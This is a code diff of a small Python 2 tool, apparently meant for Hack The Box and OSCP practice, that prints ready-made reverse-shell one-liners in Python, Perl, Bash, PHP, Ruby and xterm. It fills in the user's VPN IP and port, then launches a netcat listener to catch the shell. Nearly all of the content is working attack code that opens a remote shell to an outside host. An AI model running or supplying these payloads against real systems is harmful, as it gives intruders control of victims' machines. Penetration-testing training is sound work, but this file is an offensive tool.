@@ -5,27 +5,35 @@
 
 __author__ = "ihebski, @KeyStrOke95 Thanks for Trolls"
 __status__ = "Development 2k19"
-
+__tags__ = "Hackthebox & OSCP"
 import sys
+import os
 from colorama import Fore, Back, Style
 import subprocess
 
 
 def start(argv):
-    if len(sys.argv) < 3:
-    	print '''Dude, IP & Port ???     ¯\_(ツ)_/¯ '''
+    if len(sys.argv) < 2:
+    	print '''Dude, IP or Port ???     ¯\_(ツ)_/¯ '''
         sys.exit()
     else:
-        main(argv[0],argv[1])
-
+    	if len(sys.argv) == 3 :
+    		main(argv[0],argv[1])
+    	else:	
+    		ip = os.popen('ip addr show tun0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
+    		if len(ip) == 0 :
+    			print Fore.RED+"VPN Connection lost !!"
+    			sys.exit()
+        	main(ip,argv[0])
 
 def main(ip,port):
+	print " [+] IP Address in use "+ip
+	print(Fore.BLUE + '\n [+] Python Payload \n')
+	print Fore.WHITE+""" python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' """.format(ip,"1234")
 	print(Fore.BLUE + '\n [+] Perl Payload \n')
 	print Fore.WHITE+""" perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' """ % (ip,port)
 	print(Fore.BLUE + '\n [+] Bash Payload \n')
 	print Fore.WHITE+""" bash -i >& /dev/tcp/{0}/{1} 0>&1 """.format(ip,port)
-	print(Fore.BLUE + '\n [+] Python Payload \n')
-	print Fore.WHITE+""" python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' """.format("127.0.0.1","1234")
 	print(Fore.BLUE + '\n [+] PHP Payload \n')
 	print Fore.WHITE+""" php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");' """.format(ip,port)
 	print(Fore.BLUE + '\n [+] Ruby Payload \n')
@@ -42,7 +50,7 @@ def main(ip,port):
 	print(Fore.BLUE + '\n [+] xTerm Payload\n')
 	print Fore.WHITE+""" xterm -display {0}:1 """.format(ip)
 	print "\n"
-	print "[+] Incoming shell *-*"
+	print "\033[32m[+] Incoming shell *-*"
 	cmd = "nc -lnvp {0}".format(port)
 	subprocess.call([cmd], shell=True)
 
